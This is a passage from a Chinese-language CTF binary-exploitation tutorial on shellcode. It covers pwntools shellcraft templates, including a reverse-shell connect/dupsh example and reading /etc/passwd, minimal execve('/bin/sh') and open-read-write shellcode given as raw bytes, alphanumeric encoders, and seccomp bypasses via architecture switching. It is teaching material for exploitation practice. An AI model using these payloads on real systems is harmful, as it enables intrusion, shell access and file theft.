20;    result = a;  // result = 10    __asm__ volatile (        &quot;addl %[b], %[result]&quot;        : [result] &quot;=r&quot; (result)        : [b] &quot;r&quot; (b), [result] &quot;0&quot; (result)    );    printf(&quot;result = %d\\n&quot;, result);  // 输出 30    return 0;&#125;\n\n\n\n\n部分\n说明\n示例\n\n\n\n汇编指令\n要执行的汇编代码，如 &quot;movl $1, %eax&quot;\n&quot;addl %[b], %[result]&quot;\n\n\n输出操作数\n汇编代码写入的 C 变量，格式：[name] &quot;约束&quot; (变量)\n[result] &quot;=r&quot; (result)\n\n\n输入操作数\n汇编代码读取的 C 变量，格式同上\n[b] &quot;r&quot; (b)\n\n\n被破坏部分\n告诉编译器哪些寄存器&#x2F;内存被修改了，如 &quot;memory&quot;、&quot;eax&quot;\n&quot;memory&quot;\n\n\n2、demo：读取内存地址 [rsp + 0x8] 的值（x86_64）#include &lt;stdio.h&gt;#include &lt;stdint.h&gt;int main() &#123;    uint64_t value;    __asm__ volatile (        &quot;movq 0x8(%%rsp), %[val]&quot;   // 从栈上读取 rsp + 0x8 处的 8 字节数据        : [val] &quot;=r&quot; (value)        // 输出到 C 变量 value        :        : &quot;memory&quot;                  // 通知编译器我们读取了内存    );    printf(&quot;[rsp + 0x8] = 0x%lx\\n&quot;, value);    return 0;&#125;\n\n四、pwn-shellcraft 模块生成 shellcodepwntools 的 shellcraft 是一个跨架构的 Shellcode 生成器。它按目标 操作系统&#x2F;CPU 架构 提供大量即用型模板（如 Linux x86&#x2F;x64&#x2F;ARM&#x2F;AArch64 等），既能直接输出 汇编文本，也能配合 asm() 输出 机器码，用于快速构造 execve(“&#x2F;bin&#x2F;sh”)、文件读写、网络通信、系统调用、栈&#x2F;寄存器操作 等常见利用原语。使用时通常通过 context(os &#x3D;…, arch &#x3D;…) 指定目标环境，或在命令行用 –context 指定；还可在命令行用 shellcraft -l 浏览可用模板、shellcraft &lt;arch&gt;.&lt;os&gt;.&lt;template&gt; 直接生成对应平台的代码\n（一）通用功能与常用模板\n通用与调试 **sh()**：\n生成触发 &#x2F;bin&#x2F;sh 的 Shellcode（最常见入口）。\n**cat(path, fd &#x3D; 1)**：打开文件并写到指定 文件描述符（默认 stdout）。\n**exit(code &#x3D; 0)**：以指定返回值退出。\n**nop()**：生成单字节 NOP。\n**breakpoint() &#x2F; trap()**：插入调试断点（常见为 int3 或 **raise(SIGTRAP)**）。\n**crash()**：触发崩溃（用于测试&#x2F;占位）。\n**infloop()**：无限循环（占位&#x2F;调试）。\n\n\n\n\n栈与数据搬运\n**push(value, …)、pushstr(string, …)、pushstr_array(reg, array, …)**：向栈压入立即数&#x2F;字符串&#x2F;指针数组（自动处理对齐与终止符）。\n**mov(dst, src)**：在汇编层面把 src 移入 dst（支持寄存器&#x2F;立即数，部分平台可自动规避 0x00&#x2F;0x0a）。\n**setregs(reg_context, …)、memcpy(dest, src, n)、xor(key, address, count)**：批量设寄存器、内存拷贝、按字节异或。\n\n\n文件与 I&#x2F;O\n**open(filename, flags, mode)、readn(fd, buf, nbytes)、write(fd, buf, nbytes)**：常用 open&#x2F;read&#x2F;write 封装（部分平台提供更高层如 cat&#x2F;cat2）。\n\n\n进程与权限\n**forkexit()**：fork 后父进程退出（让子进程成为孤儿）。\n**kill(pid, sig)、killparent()**：发送信号，或循环杀死父进程直至不可杀。\n\n\n网络（Linux 常见）\n**socket(network, proto)、connect(host, port, network)、dupio(sock)、dupsh(sock)**：创建套接字、连接、把套接字复制到 stdin&#x2F;stdout&#x2F;stderr，或在此基础上 spawn shell。\n**echo(string, sock &#x3D; 1)**：向指定 fd 写字符串。\n\n\n其它常用\n**sleep(seconds)**：基于 nanosleep 的休眠。\n**stage(fd &#x3D; 0, length &#x3D; None)**：从 fd 接收数据并迁移&#x2F;重定位 Shellcode 到新缓冲区（常用于第二阶段加载）。\nloader(address) &#x2F; **loader_append(data &#x3D; None)**：在指定地址加载静态 ELF 并跳转（或加载附加的 ELF 数据）\n\n\n\n（二）典型用法示例\n生成并获取机器码\n交互式获取汇编：\nprint(shellcraft.sh())\n\n\n获取机器码：\nprint(enhex(asm(shellcraft.sh())))\n\n\n\n\n指定架构&#x2F;系统\n命令行：shellcraft aarch64.linux.sh\n脚本：context(os &#x3D;’linux’, arch &#x3D;’aarch64’); asm(shellcraft.sh())\n\n\n文件读取并输出\nasm_cat &#x3D; shellcraft.cat(‘&#x2F;etc&#x2F;passwd’) + shellcraft.exit(0)\nprint(enhex(asm(asm_cat)))\n\n\n网络连接与反弹 Shell\nasm_conn &#x3D; shellcraft.connect(‘127.0.0.1’, 1337) + shellcraft.dupsh(‘x12’)\n发送 asm(asm_conn) 到目标后，nc -lvnp 1337 即可获得交互式 Shell\n\n\n\n（三）帮助文档shellcraft -husage: pwn shellcraft [-h] [-?] [-o file] [-f format] [-d] [-b] [-a] [-v AVOID] [-n] [-z] [-r] [--color] [--no-color] [--syscalls] [--address ADDRESS] [-l] [-s]                      [shellcode] [arg [arg ...]]Microwave shellcode -- Easy, fast and deliciouspositional arguments:  shellcode             The shellcode you want  arg                   Argument to the chosen shellcodeoptional arguments:  -h, --help            show this help message and exit  -?, --show            Show shellcode documentation  -o file, --out file   Output file (default: stdout)  -f format, --format format                        Output format (default: hex), choose from &#123;e&#125;lf, &#123;r&#125;aw, &#123;s&#125;tring, &#123;c&#125;-style array, &#123;h&#125;ex string, hex&#123;i&#125;i, &#123;a&#125;ssembly code, &#123;p&#125;reprocssed code,                        escape&#123;d&#125; hex string  -d, --debug           Debug the shellcode with GDB  -b, --before          Insert a debug trap before the code  -a, --after           Insert a debug trap after the code  -v AVOID, --avoid AVOID                        Encode the shellcode to avoid the listed bytes  -n, --newline         Encode the shellcode to avoid newlines  -z, --zero            Encode the shellcode to avoid NULL bytes  -r, --run             Run output  --color               Color output  --no-color            Disable color output  --syscalls            List syscalls  --address ADDRESS     Load address  -l, --list            List available shellcodes, optionally provide a filter  -s, --shared          Generated ELF is a shared library\n\n五、最短shellcode（一）getshell长度为22字节主要是通过cdq将rdx高位为0，减小了长度，另一种方法是通过mul r&#x2F;m64指令，实现清空rax和rdx\n\neax 高二位必须为0，一般是满足的\n\nxor \trsi, rsipush\trsi\tmov \trdi, 0x68732f2f6e69622fpush\trdipush\trsp\t\tpop\t    rdi\t\t\tmov \tal,\t59\tcdq\t\t\t\tsyscall\n\n48 31 f6             xor rsi, rsi\t56\t                 push rsi58 bf 2f 62 69 6e 2f mov rdi,\t0x68732f2f6e69622f;2f 73 6857                   push rdi54                   push rsp\t\t5f                   pop rdi     ;stack pointer to /bin//shb0 3b                mov al, 59\t ;sys_execve 66 b8 3b 00 mov ax,5999                   cdq \t   \t ;sign extend of eax0f 05                syscall\n\n// int0x622fbf4856f631480x545768732f2f6e690x050f993bb05f// bytes\\x48\\x31\\xf6\\x56\\x48\\xbf\\x2f\\x62\\x69\\x6e\\x2f\\x2f\\x73\\x68\\x57\\x54\\x5f\\xb0\\x3b\\x99\\x0f\\x05\n\n（二）ORW长度为0x28字节主要是通过异或实现了取代了mov减少长度\n\nrsp指向的地址必须是可用的\n存在NULL字符\n\n// rdx为写入数量mov rdx, 0x200push 0x67616c66mov rdi,rspxor esi,esi  #如果本来rsi=0，可以删掉这句mov eax,2syscallmov edi,eaxmov rsi,rspxor eax,eaxsyscallxor edi,2  mov eax,edisyscall  \n\n0x6800000200c2c7480x31e7894867616c660x050f00000002b8f60x0fc031e68948c7890x050ff88902f78305\\x48\\xc7\\xc2\\x00\\x02\\x00\\x00\\x68\\x66\\x6c\\x61\\x67\\x48\\x89\\xe7\\x31\\xf6\\xb8\\x02\\x00\\x00\\x00\\x0f\\x05\\x89\\xc7\\x48\\x89\\xe6\\x31\\xc0\\x0f\\x05\\x83\\xf7\\x02\\x89\\xf8\\x0f\\x05\n\n可指定地点\nshellcode = &quot;&quot;&quot;xor rdx,rdxmov dh, 0x2mov rdi,&#123;&#125;xor esi,esi  mov eax,2syscallmov rsi,rdimov edi,eaxxor eax,eaxsyscallxor edi,2mov eax,edisyscall&quot;&quot;&quot;.format(hex(target_addr + 0xb0))\n\n\n\n六、字符限制\n\n\n\nae64\nalpha3\n\n\n\nEncode x32 alphanumeric shellcode\n❌\n✔\n\n\nEncode x64 alphanumeric shellcode\n✔\n❌\n\n\nOriginal shellcode can contain zero bytes\n✔\n❌\n\n\nBase address register can contain offset\n✔\n\n\n\n（一）Alpha3限制只能使用字母或者数字alpha3使用:alpha3需要python2环境，所以先安装python2。可以选择架构、编码、限制的字符\nfrom pwn import *context.arch=&#x27;amd64&#x27;sc = b&quot;\\x48\\x31\\xf6\\x56\\x48\\xbf\\x2f\\x62\\x69\\x6e\\x2f\\x2f\\x73\\x68\\x57\\x54\\x5f\\x31\\xc0\\xb0\\x3b\\x99\\x0f\\x05&quot;with open(&quot;./sc.bin&quot;,&#x27;wb&#x27;) as f:    f.write(sc)# python2 ALPHA3.py x64 ascii mixedcase rdx --input=&quot;sc.bin&quot; &gt; out.bin \n\n\n\n（二）ae64AE64可以直接在python中导入，使用相对较为方便且限制较少\nfrom ae64 import AE64from pwn import *context.arch=&#x27;amd64&#x27;# get bytes format shellcodeshellcode = asm(shellcraft.sh())# get alphanumeric shellcodeenc_shellcode = AE64().encode(shellcode)print(enc_shellcode.decode(&#x27;latin-1&#x27;))\n\n\n\n（三）手动绕过Alphanumeric shellcode - NetSec\n\nx86_64 alphanumeric execve(‘&#x2F;bin&#x2F;sh’,null,null) - 111 bytes:\n\njZTYX4UPXk9AHc49149hJG00X5EB00PXHc1149Hcq01q0Hcq41q4Hcy0Hcq0WZhZUXZX5u7141A0hZGQjX5u49j1A4H3y0XWjXHc9H39XTH394c\n\n（四）限制字母和数字很多时候，会限制为纯小写字母或者部分字母或者部分数字。这个时候，需要根据限制条件，把能用的shellcode组合梳理出来，然后结合shellcode的执行地址，利用xor/add等指令，构造出其他所需要的指令。\n举个例子，假如shellcode执行地址0x333100，只能用0x30-0x40编写shellcode，如果需要\\x0f\\x05，可以用异或：\nxor eax, 0x33333130; 3530313333xor eax, 0x3333343f; 353f343333;此时，eax就成为0x050f了\n\n可以用pwntools的disasm爆破所有可能的shellcode组合：\nimport itertoolsfrom pwn import *context.arch = &quot;amd64&quot;s = &quot;0123456789\\x3a\\x3b\\x3c\\x3d\\x3e\\x3f\\x40&quot;for x in range(3):    for y in itertools.product(s, repeat=x+1):        res = disasm(&quot;&quot;.join(y).encode())        need_p = 1        for kk in  (&quot;.byte&quot;, &quot;rex&quot;, &quot;ds&quot;, &quot;bad&quot;, &quot;ss&quot;):            if kk in res:                need_p = 0                break        if need_p:            print(res)\n\n\n\n沙箱绕过（一）at&#x2F;v&#x2F;2替换这里分别指的是几个系统调用的后缀和前缀，比如：\n\n使用execveat代替execve，拿到shell后，使用shell内置命令读取flag: echo *; read FLAG &lt; /flag;echo $FLAG，否则使用子shell执行命令还是会被沙箱杀死。同样的，使用openat代替open。\n使用readv/writev代替read/write\n使用mmap2代替mmap\n还有一些特殊的系统调用，使用sendfile，代替read/write。这类的系统调用需要平时多关注、收集和整理。\n\n（二）使用orw读取flag一般来说，会禁止system/execve/fork等，这个时候使用open+read+write输出flag即可。\n或者使用open+sendfile，指令会更短。\n（三）切换指令模式$ seccomp-tools dump ./pwn line  CODE  JT   JF      K================================= 0000: 0x20 0x00 0x00 0x00000004  A = arch 0001: 0x15 0x00 0x08 0xc000003e  if (A != ARCH_X86_64) goto 0010 0002: 0x20 0x00 0x00 0x00000000  A = sys_number 0003: 0x35 0x06 0x00 0x40000000  if (A &gt;= 0x40000000) goto 0010 0004: 0x15 0x05 0x00 0x0000003b  if (A == execve) goto 0010 0005: 0x15 0x04 0x00 0x00000142  if (A == execveat) goto 0010 0006: 0x15 0x03 0x00 0x00000039  if (A == fork) goto 0010 0007: 0x15 0x02 0x00 0x00000038  if (A == clone) goto 0010 0008: 0x15 0x01 0x00 0x0000000f  if (A == rt_sigreturn) goto 0010 0009: 0x06 0x00 0x00 0x7fff0000  return ALLOW 0010: 0x06 0x00 0x00 0x00000000  return KILL\n\n这个沙箱规则判断了当前触发系统调用的时候，arch是否为x64，如果不是64就会kill；然后，判断了sys-number是否大于等于0x40000000，如果大于，程序也会被kill；然后设置了黑名单，分别是：execve/execveat/fork/clone/rt_sigreturn。处于黑名单的系统调用会被kill掉，其他系统调用则会放行。\n如果没有0001: 0x15 0x00 0x08 0xc000003e if (A != ARCH_X86_64) goto 0010这一句的检查，那么可以使用retf(return far)指令实现架构切换，或者在x64环境下直接调用int 0x80陷入到内核态。\nretf相当于pop ip; pop cs，cs是段寄存器，寄存器为0x23时表示32位运行模式，0x33表示64位运行模式。\n从64位切换到32位的模板如下：\nxor esp, espmov rsp, 0x400100mov eax, 0x23 ; csmov [rsp+4], eaxmov eax, 0x400800 ; ipmov [rsp], eaxretf\n\n如果没有限制：0003: 0x35 0x06 0x00 0x40000000 if (A &gt;= 0x40000000) goto 0010的话，那么可以使用0x40000000 + X来执行系统调用。\n#define __X32_SYSCALL_BIT\t0x40000000UL\n\n关于x32 ABI可查看x32 ABI - Wikipedia。\n比如要执行read\nxor eax, eaxadd eax, 0x40000000xor edi, edimov rsi, rspmov edx, 0x300syscall\n\n需要注意的是，从5.16开始，linux内核不支持x32 abi了：Bug #1994516 “Kernels after 5.16 cannot execute x32-ABI binaries…” : Bugs : linux package : Ubuntu (launchpad.net)\n七、Tricks\n当寄存器全 0 时，只需要执行一次 syscall，就会把返回地址 rip 赋值给 rcx 寄存器，rcx 寄存器就会有 rwx 地址，然后再 mov rsi,rcx;mov dl,0xff;syscall，就会 reread\n\nsyscall   //0f 05\nmov rsi, rcx  //48 89 ce\nmov dl, 0xff //b2 ff\nsyscall  //0f 05\n\n\n\n\n使用 mov 时，对同一个寄存器的不同部分操作，指令字长不一样。例如，mov dl, 0xff 只有 9 个字节，而 mov rdx, 0xff 有 14 个字节，mov edx, 0xff 有 12 个字节\n\n\n\n\n64 位\n32 位\n16 位\n高 8 位(H)\n低 8 位(L)\n主要用途\n\n\n\nRAX​\nEAX​\nAX​\nAH​\nAL​\n累加器, 返回值, 系统调用号\n\n\nRBX​\nEBX​\nBX​\nBH​\nBL​\n基址指针, 保留寄存器\n\n\nRCX​\nECX​\nCX​\nCH​\nCL​\n计数器, 第 4 个参数\n\n\nRDX​\nEDX​\nDX​\nDH​\nDL​\n数据寄存器, 第 3 个参数\n\n\nRSI​\nESI​\nSI​\n\nSIL​\n源索引, 第 2 个参数\n\n\nRDI​\nEDI​\nDI​\n\nDIL​\n目的索引, 第 1 个参数\n\n\nRSP​\nESP​\nSP\n\nSPL​\n栈指针\n\n\nRBP​\nEBP​\nBP​\n\nBPL​\n基址指针(栈帧)\n\n\n\n\n\n很多场景下所能填写的shellcode长度受限，为此，了解各个指令的长度对于手写满足条件的shellcode有着重要的导向作用\n\n\n\n\n指令\n常见最小长度\n常见最大长度\n示例（64位模式）\n\n\n\nmov\n2 字节\n7+ 字节\nmov eax, ecx(2B), mov rax, [rsi+rcx*8+10h](可能5-6B)\n\n\nadd&#x2F;sub\n2 字节\n6+ 字节\nadd eax, ebx(2B), sub qword ptr [rsp+30h], 1(可能6B)\n\n\npush&#x2F;pop\n1 字节\n5 字节\npush rdi(1B), push 0FFFFFFFFh(5B)\n\n\n\nret（0xC3）、leave（0xC9）、xchg（0x90 与寄存器编码）\n\n\n\n\n八、shellcode网站\nOnline x86 and x64 Intel Instruction Assembler (defuse.ca): 在线编写shellcode和反汇编shellcode，目前只支持x86/x64\nOnline Assembler and Disassembler (shell-storm.org): 另一个更全的在线编写shellcode和反汇编shellcode网站\nShellcodes database for study cases (shell-storm.org): shellcode数据库，支持很多指令集与操作系统\nExploit Database Shellcodes (exploit-db.com): 另一个shellcode数据库\nOnline - Reverse Shell Generator (revshells.com): 生成反弹shell的命令\n\n九、参考链接The art of shellcode - LynneHuan - 博客园\nPwn.the-Art-of-Shellcode | V3rdant’s Blog\nAlphanumeric shellcode - NetSec\n"}]